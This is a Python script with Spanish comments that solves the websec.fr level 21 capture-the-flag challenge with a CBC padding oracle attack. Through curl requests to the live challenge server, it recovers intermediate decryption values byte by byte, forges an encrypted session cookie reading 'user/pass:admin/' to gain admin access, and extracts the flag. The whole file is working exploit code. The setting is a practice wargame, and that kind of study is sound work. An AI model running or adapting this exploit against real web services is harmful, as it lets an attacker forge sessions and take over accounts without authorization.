#!/usr/bin/env python3
"""
Solución definitiva usando Padding Oracle Attack
Voy a cifrar el plaintext deseado usando el oracle
"""
import binascii
import subprocess
import sys

def oracle_test(cookie_hex):
    """Oracle: True si padding válido"""
    cmd = f'timeout 5s curl -s https://websec.fr/level21/index.php --cookie "session={cookie_hex}"'
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    # "Wrong" = padding válido, credenciales incorrectas
    # "corrupted" = padding inválido
    return "Wrong" in result.stdout

def find_intermediate_byte(ct_dummy, intermediate_known, pad_val, oracle_func):
    """Encuentra un byte del valor intermedio"""
    test_prev = bytearray(16)
    
    # Setear bytes ya conocidos para producir padding correcto
    for k in range(1, pad_val):
        test_prev[16 - k] = intermediate_known[16 - k] ^ pad_val
    
    # Probar valores para el byte actual
    pos = 16 - pad_val
    for guess in range(256):
        test_prev[pos] = guess
        
        test_cookie = binascii.hexlify(test_prev).decode() + binascii.hexlify(ct_dummy).decode()
        
        if oracle_func(test_cookie):
            return guess ^ pad_val
    
    return None

def craft_block(desired_plaintext, oracle_func):
    """
    Cifra un bloque de plaintext deseado
    Retorna (IV, CT) donde IV XOR D(K,CT) = desired_plaintext
    """
    if len(desired_plaintext) != 16:
        raise ValueError("Must be 16 bytes")
    
    # Usar CT de ceros (puede ser cualquier valor conocido)
    ct_dummy = bytes(16)
    
    # Encontrar el valor intermedio D(K, CT_dummy)
    intermediate = bytearray(16)
    
    print(f"Descifrando valor intermedio (16 bytes):")
    
    for pad_val in range(1, 17):
        pos = 16 - pad_val
        print(f"  Byte {pos}...", end='', flush=True)
        
        byte_val = find_intermediate_byte(ct_dummy, intermediate, pad_val, oracle_func)
        
        if byte_val is None:
            print(f" FAILED")
            return None
        
        intermediate[pos] = byte_val
        print(f" 0x{byte_val:02x}")
    
    # Calcular IV necesario: IV = intermediate XOR desired_plaintext
    iv_needed = bytearray(16)
    for i in range(16):
        iv_needed[i] = intermediate[i] ^ desired_plaintext[i]
    
    return (bytes(iv_needed), ct_dummy)

print("=== PADDING ORACLE - CIFRADO DE PLAINTEXT ARBITRARIO ===\n")
print("Objetivo: Cifrar 'user/pass:admin/'")
print("Esto hará hasta ~4000 requests y tomará tiempo...\n")

target = b"user/pass:admin/"
if len(target) < 16:
    target = target + b'\x00' * (16 - len(target))

print(f"Target plaintext: {target}\n")

result = craft_block(target, oracle_test)

if result:
    iv, ct = result
    cookie_final = binascii.hexlify(iv).decode() + binascii.hexlify(ct).decode()
    
    print(f"\n✓ Cookie crafteada: {cookie_final}")
    print(f"\nProbando la cookie...")
    
    cmd = f'timeout 8s curl -s https://websec.fr/level21/index.php --cookie "session={cookie_final}"'
    response = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    
    import re
    flag_match = re.search(r'WEBSEC\{[^}]+\}', response.stdout)
    if flag_match:
        print(f"\n★★★★★ FLAG: {flag_match.group(0)} ★★★★★")
    elif "Hello admin" in response.stdout:
        print(f"★★★ Hello admin! ★★★")
    else:
        print(f"Resultado: {'Wrong' if 'Wrong' in response.stdout else 'Otro'}")
else:
    print("\n✗ Fallo al cifrar")

